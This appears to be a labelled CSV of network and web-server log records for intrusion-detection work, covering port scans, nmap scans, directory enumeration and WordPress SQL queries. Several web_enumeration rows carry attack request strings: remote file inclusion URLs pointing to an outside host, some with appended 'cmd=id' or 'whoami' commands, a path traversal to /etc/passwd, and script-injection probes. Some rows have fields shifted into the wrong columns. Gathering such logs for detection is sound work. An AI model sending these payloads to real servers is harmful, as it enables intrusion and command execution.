@timestamp,src_ip,src_port,dst_ip,dst_port,Protocol,http_request_method,http_request_referrer,http_response_code,url_path,user_agent_original,sql_method,sql_query,category,label_
1666591297,10.0.0.20,33810,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'medium_crop' LIMIT 1,sql_enumeration,0
1666582473,192.168.207.142,0,0,0,HTTPS,GET,0,404,/stats/,Mozilla/5.00,0,0,web_enumeration,1
1666692057,10.32.4.176,54362,10.132.100.52,7002,TCP,0,0,0,0,0,0,0,port_scan,0
1666582480,192.168.207.142,0,0,0,HTTPS,GET,0,404,/lib/rs.php?rootpath=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666692057,10.32.4.176,43184,10.132.100.52,5500,TCP,0,0,0,0,0,0,0,port_scan,0
1666692056,10.32.4.176,41902,10.132.100.52,3000,TCP,0,0,0,0,0,0,0,port_scan,0
1666582468,192.168.207.142,0,0,0,HTTPS,GET,0,404,/rtm.log,Mozilla/5.00,0,0,web_enumeration,1
1666691984,10.32.4.176,47000,10.132.100.53,3801,TCP,0,0,0,0,0,0,0,port_scan,0
1666691984,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691984,10.32.4.176,47248,10.132.100.53,8093,TCP,0,0,0,0,0,0,0,port_scan,0
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666591067,10.0.0.20,33610,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'theme_switched' LIMIT 1,sql_enumeration,0
1666580400,192.168.207.142,0,0,0,HTTPS,GET,0,404,/admin/code/index.php?load_page=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/rpc.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666591627,10.0.0.20,34088,10.0.0.21,3306,mysql,0,0,0,0,0,SET,"SET SESSION sql_mode='ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION'",sql_enumeration,0
1666692057,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692146,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666582465,192.168.207.142,0,0,0,HTTPS,GET,0,404,/webmail.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666591527,10.0.0.20,34004,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent_comments' LIMIT 1,sql_enumeration,0
1666582485,192.168.207.142,0,0,0,HTTPS,GET,0,404,/js/editor/fckeditor/editor/filemanager/connectors/php/connector.php?Command=GetFolders&Type=File&CurrentFolder=%2F,Mozilla/5.00,0,0,web_enumeration,1
1666582469,192.168.207.142,0,0,0,HTTPS,GET,0,404,/phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003%00-1&month=,Mozilla/5.00,0,0,web_enumeration,1
1666692057,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1664373316,192.168.91.15,62792,239.255.255.250,1900,UDP,0,0,0,0,0,0,0,port_scan,2
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666690179,192.168.34.11,53116,0,0,HTTP,0,0,0,0,0,0,0,web_enumeration,1
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/network.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692146,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666591899,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666631163,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666590580,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666542072,192.168.106.1,53776,192.168.106.130,53,2022-10-24 00:20:50 ALLOW UDP 192.168.106.1 192.168.106.130 53776 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/workplace,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666631295,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666692075,10.132.100.50,0,10.32.4.176,0,UDP,0,0,0,0,0,0,0,port_scan,0
1666582474,192.168.207.142,0,0,0,HTTPS,GET,0,404,/3rdparty/phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00,Mozilla/5.00,0,0,web_enumeration,1
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/win.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666541373,0,53490,127.0.0.1,53489,0,0,0,0,0,0,0,0,port_scan,3
1666542072,192.168.106.1,53486,192.168.106.130,53,2022-10-24 00:20:44 ALLOW UDP 192.168.106.1 192.168.106.130 53486 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1664374137,192.168.91.128,50304,192.168.91.1,139,TCP,0,0,0,0,0,0,0,port_scan,2
1666580405,192.168.207.142,0,0,0,HTTPS,GET,0,404,/admin/index.asp,Mozilla/5.00,0,0,web_enumeration,1
1666631330,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666582465,192.168.207.142,0,0,0,HTTPS,GET,0,404,/visitor.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666580408,192.168.207.142,0,0,0,HTTPS,POST,0,404,/wp-content/plugins/ckeditor-for-wordpress/ckeditor/samples/sample_posteddata.php,Mozilla/5.00,0,0,web_enumeration,1
1666591290,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666691993,10.132.100.53,22,10.32.4.176,57592,TCP,0,0,0,0,0,0,0,port_scan,0
1666580405,192.168.207.142,0,0,0,HTTPS,GET,0,404,/upload/admin/frontpage_right.php?loadadminpage=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666590577,10.0.0.20,33194,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'WPLANG' LIMIT 1,sql_enumeration,0
1666590640,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666541343,127.0.0.1,53325,127.0.0.1,1120,2022-10-24 00:08:48 ALLOW TCP 127.0.0.1 127.0.0.1 53325 1120 0 - 0 0 0 - - - SEND 6624,TCP,0,0,0,0,0,0,port_scan,3
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/report,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666582470,192.168.207.142,0,0,0,HTTPS,GET,0,404,/<script>alert('Vulnerable')</script>,Mozilla/5.00,0,0,web_enumeration,1
1666692065,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666692076,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691931,100.64.19.103,57118,100.64.19.22,6543,TCP,0,0,0,0,0,0,0,port_scan,3
1666692058,10.32.4.176,45746,10.132.100.52,5566,TCP,0,0,0,0,0,0,0,port_scan,0
1666580397,192.168.207.142,0,0,0,HTTPS,GET,0,404,/ez2000/ezman.cgi,Mozilla/5.00,0,0,web_enumeration,1
1666582484,192.168.207.142,0,0,0,HTTPS,GET,0,404,/dswsbobje/axis2-web/HappyAxis.jsp,Mozilla/5.00,0,0,web_enumeration,1
1666691953,100.64.19.103,43476,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666542719,192.168.1.225,59131,192.168.1.254,53,2022-10-24 00:31:35 ALLOW UDP 192.168.1.225 192.168.1.254 59131 53 0 - - - - - - - SEND 2384,UDP,0,0,0,0,0,0,port_scan,2
1666712777, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666690179,192.168.34.11,53206,192.168.33.12,0,HTTP,0,0,0,/modif_infos.asp,0,0,0,web_enumeration,2
1666582484,192.168.207.142,0,0,0,HTTPS,GET,0,404,/plugins/fckeditor/fckconfig.js,Mozilla/5.00,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1664428800,192.168.91.128,39232,192.168.91.1,94,tcp,0,0,0,0,0,0,0,port_scan,2
1666630953,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666705101, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666582484,192.168.207.142,0,0,0,HTTPS,GET,0,404,/include/fckeditor/_whatsnew.html,Mozilla/5.00,0,0,web_enumeration,1
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/attach.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666690179,192.168.34.11,53232,192.168.33.12,0,HTTP,0,0,0,/ttforum/index.php,0,0,0,web_enumeration,2
1666591867,10.0.0.20,34290,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT option_name, option_value FROM wp_options WHERE autoload = 'yes'",sql_enumeration,0
1666692119,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691975,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692076,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666512277,192.168.0.3,0,0,0,0,0,0,0,0,0,0,0,smtp_enumeration,1
1666691983,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580401,192.168.207.142,0,0,0,HTTPS,GET,0,404,/core/archive_nocat.php?absoluteurlhttp://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666712777, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666582483,192.168.207.142,0,0,0,HTTPS,GET,0,404,/scriptresource.axd?d=junk,Mozilla/5.00,0,0,web_enumeration,1
1666691932,100.64.19.103,59252,100.64.19.22,4006,TCP,0,0,0,0,0,0,0,port_scan,3
1664368844,192.168.91.128,47014,192.168.91.1,445,TCP,0,0,0,0,0,0,0,port_scan,2
1666591307,10.0.0.20,33820,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT FOUND_ROWS(),sql_enumeration,0
1666580403,192.168.207.142,0,0,0,HTTPS,GET,0,404,/language/lang_german/lang_main_album.php?phpbb_root_path=http://cirt.net/rfiinc.txt??a=,Mozilla/5.00,0,0,web_enumeration,1
1666590600,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666691930,100.64.19.103,46138,100.64.19.22,6005,TCP,0,0,0,0,0,0,0,port_scan,3
1666704048, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580403,192.168.207.142,0,0,0,HTTPS,GET,0,200,/index.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id,Mozilla/5.00,0,0,web_enumeration,1
1666580393,192.168.207.142,0,0,0,HTTPS,GET,0,404,/207.war,Mozilla/5.00,0,0,web_enumeration,1
1666591077,10.0.0.20,33618,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT wp_posts.* FROM wp_posts WHERE ID IN (1),sql_enumeration,0
1666691983,10.32.4.176,40510,10.132.100.53,1417,TCP,0,0,0,0,0,0,0,port_scan,0
1666704105, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692118,10.132.101.52,34596,10.132.101.101,3306,TCP,0,0,0,0,0,0,0,port_scan,0
1666691932,100.64.19.103,41320,100.64.19.22,32772,TCP,0,0,0,0,0,0,0,port_scan,3
1666591137,10.0.0.20,33670,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'WPLANG' LIMIT 1,sql_enumeration,0
1666580404,192.168.207.142,0,0,0,HTTPS,GET,0,404,/themes/default/layouts/standard.php?page_include=http://cirt.net/rfiinc.txt??&act=cmd&cmd=whoami&d=/&submit=1&cmd_txt=1,Mozilla/5.00,0,0,web_enumeration,1
1666690178,192.168.34.11,53112,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/nlog0smb.cgi,0,0,0,web_enumeration,2
1666692118,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666542198,192.168.1.225,65446,192.168.1.254,53,2022-10-24 00:22:50 ALLOW UDP 192.168.1.225 192.168.1.254 65446 53 0 - - - - - - - SEND 2384,UDP,0,0,0,0,0,0,port_scan,2
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692123,10.132.101.52,38256,10.132.101.101,3306,TCP,0,0,0,0,0,0,0,port_scan,0
1664373799,192.168.91.15,64358,239.255.255.250,1900,UDP,0,0,0,0,0,0,0,port_scan,2
1666692057,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666542072,0,53433,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666542593,192.168.1.225,65449,224.0.0.252,5355,UDP,0,0,0,0,0,0,0,port_scan,2
1666691985,10.32.4.176,42410,10.132.100.53,3800,TCP,0,0,0,0,0,0,0,port_scan,0
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/alias,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666591197,10.0.0.20,33720,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID
					FROM wp_posts 
					WHERE 1=1  AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish')))
					
					ORDER BY wp_posts.post_date DESC
					LIMIT 0, 10",sql_enumeration,0
1666690179,192.168.34.11,53206,192.168.33.12,0,HTTP,0,0,0,/ixmail_netattach.php,0,0,0,web_enumeration,2
1666542071,0,50970,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666631329,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666695088, 192.168.10.2,9200,47634,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692145,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666712776, 10.0.0.3,44538,8080,192.168.10.2,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580393,192.168.207.142,0,0,0,HTTPS,GET,0,404,/site.tar,Mozilla/5.00,0,0,web_enumeration,1
1666630779,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666580394,192.168.207.142,0,0,0,HTTPS,GET,0,404,/ht_root/wwwroot/-/local/httpd$map.conf,Mozilla/5.00,0,0,web_enumeration,1
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/ramon.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666691929,100.64.19.103,51250,100.64.19.22,3869,TCP,0,0,0,0,0,0,0,port_scan,3
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666591227,10.0.0.22,0,10.0.0.20,0,0,0,0,0,0,0,0,0,sql_enumeration,0
1666712777, 10.0.0.3,4444,45898,192.168.10.2,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666591320,0,0,10.0.0.20,0,0,0,0,0,0,0,0,0,sql_enumeration,0
1666542071,0,50976,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666691985,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/readme,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666542072,0,53487,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666712777, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692058,10.32.4.176,41566,10.132.100.52,2006,TCP,0,0,0,0,0,0,0,port_scan,0
1664374517,192.168.91.15,58038,239.255.255.250,1900,UDP,0,0,0,0,0,0,0,port_scan,2
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692056,10.32.4.176,57878,10.132.100.52,8090,TCP,0,0,0,0,0,0,0,port_scan,0
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/sysadmin,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666580408,192.168.207.142,0,0,0,HTTPS,GET,0,404,/ws/EchoHeaders.jws?method=list,Mozilla/5.00,0,0,web_enumeration,1
1666542056,192.168.106.1,50842,192.168.106.130,53,2022-10-24 00:20:34 ALLOW UDP 192.168.106.1 192.168.106.130 50842 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666695594, 192.168.10.2,9200,47634,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580402,192.168.207.142,0,0,0,HTTPS,GET,0,404,/includes/lang/language.php?path_to_root=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666542072,192.168.1.254,33947,239.255.255.250,1900,2022-10-24 00:20:42 DROP UDP 192.168.1.254 239.255.255.250 33947 1900 511 - - - - - - - RECEIVE 11164,UDP,0,0,0,0,0,0,port_scan,2
1666591230,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/svc.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691994,10.132.100.53,445,10.32.4.176,41686,TCP,0,0,0,0,0,0,0,port_scan,0
1666590660,0,0,10.0.0.20,80,0,0,0,0,0,0,0,0,sql_enumeration,0
1666691974,10.132.100.52,0,10.32.4.176,0,ICMP,0,0,0,0,0,0,0,port_scan,0
1666691982,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666591197,10.0.0.20,33720,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'large_crop' LIMIT 1,sql_enumeration,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/Stats.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666690179,192.168.34.11,53232,192.168.33.12,0,HTTP,0,0,0,/tmp_view.php,0,0,0,web_enumeration,2
1666542161,172.20.16.1,63536,239.255.255.250,1900,2022-10-24 00:22:08 ALLOW UDP 172.20.16.1 239.255.255.250 63536 1900 0 - - - - - - - SEND 17808,UDP,0,0,0,0,0,0,port_scan,2
1666542079,192.168.106.1,61383,192.168.106.130,53,2022-10-24 00:21:02 ALLOW UDP 192.168.106.1 192.168.106.130 61383 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666591847,10.0.0.22,0,10.0.0.21,0,0,0,0,0,0,0,0,0,sql_enumeration,0
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/security.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666691929,100.64.19.103,57792,100.64.19.22,3476,TCP,0,0,0,0,0,0,0,port_scan,3
1666582482,192.168.207.142,0,0,0,HTTPS,GET,0,404,/theme/phpAutoVideo/LightTwoOh/sidebar.php?loadpage=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666691984,10.32.4.176,37006,10.132.100.53,1046,TCP,0,0,0,0,0,0,0,port_scan,0
1666722172, 172.24.2.11 ,0,172.24.2.100,0,HTTP,GET,0,404,/webservices ,gobuster/3.2.0-dev,0,0,web_enumeration,3
1666542072,0,51147,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580408,192.168.207.142,0,0,0,HTTPS,GET,0,404,/index.jsp,Mozilla/5.00,0,0,web_enumeration,1
1666348220,192.168.0.4,39146,192.168.0.3,110,tcp,0,0,0,0,0,0,0,port_scan,2
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580399,192.168.207.142,0,0,0,HTTPS,GET,0,404,/modules/fckeditor/fckeditor/editor/dialog/fck_link.html,Mozilla/5.00,0,0,web_enumeration,1
1666591890,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666692066,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666542443,192.168.1.225,54624,49.44.251.228,443,2022-10-24 00:26:56 ALLOW TCP 192.168.1.225 49.44.251.228 54624 443 0 - 0 0 0 - - - SEND 18232,TCP,0,0,0,0,0,0,port_scan,1
1666630363,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666690178,192.168.34.11,53112,192.168.33.12,0,HTTP,0,0,0,/vc30/,0,0,0,web_enumeration,2
1666580395,192.168.207.142,0,0,0,HTTPS,GET,0,404,/level/16/level/16/exec//show/interfaces,Mozilla/5.00,0,0,web_enumeration,1
1666692139,10.132.101.52,55716,10.132.101.101,22,TCP,0,0,0,0,0,0,0,port_scan,0
1666580393,192.168.207.142,0,0,0,HTTPS,GET,0,404,/192168207167.tar.gz,Mozilla/5.00,0,0,web_enumeration,1
1666692043,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666541343,127.0.0.1,53295,127.0.0.1,1120,2022-10-24 00:08:43 ALLOW TCP 127.0.0.1 127.0.0.1 53295 1120 0 - 0 0 0 - - - SEND 6624,TCP,0,0,0,0,0,0,port_scan,3
1666691984,10.32.4.176,39924,10.132.100.53,668,TCP,0,0,0,0,0,0,0,port_scan,0
1666580395,192.168.207.142,0,0,0,HTTPS,GET,0,404,/webchat/register.php?register=yes&username=OverG&email=<script>alert%20(\x5C\x22Vulnerable\x5C\x22)</script>&email1=<script>alert%20(\x5C\x22Vulnerable\x5C\x22)</script>,Mozilla/5.00,0,0,web_enumeration,1
1666421680,192.168.0.3,54468,192.168.0.2,9200,tcp,0,0,0,0,0,0,0,port_scan,2
1666541336,127.0.0.1,53174,127.0.0.1,1120,2022-10-24 00:08:25 ALLOW TCP 127.0.0.1 127.0.0.1 53174 1120 0 - 0 0 0 - - - RECEIVE 4432,TCP,0,0,0,0,0,0,port_scan,3
1666542593,127.0.0.1,54743,127.0.0.1,54742,TCP,0,0,0,0,0,0,0,port_scan,3
1666582477,192.168.207.142,0,0,0,HTTPS,GET,0,404,/admin.php?submit=submit&form_include_template=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666542079,192.168.106.1,61877,192.168.106.130,53,2022-10-24 00:20:58 ALLOW UDP 192.168.106.1 192.168.106.130 61877 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666691983,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666591907,10.0.0.20,34324,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent-comments' LIMIT 1,sql_enumeration,0
1666691930,100.64.19.103,37888,100.64.19.22,3826,TCP,0,0,0,0,0,0,0,port_scan,3
1666542615,192.168.1.254,33947,239.255.255.250,1900,2022-10-24 00:29:42 DROP UDP 192.168.1.254 239.255.255.250 33947 1900 507 - - - - - - - RECEIVE 11164,UDP,0,0,0,0,0,0,port_scan,2
1666347840,192.168.0.3,58224,192.168.0.2,9200,tcp,0,0,0,0,0,0,0,port_scan,2
1666582473,192.168.207.142,0,0,0,HTTPS,GET,0,404,/ixmail_netattach.php,Mozilla/5.00,0,0,web_enumeration,1
1666692139,10.132.101.52,53940,10.132.101.101,22,TCP,0,0,0,0,0,0,0,port_scan,0
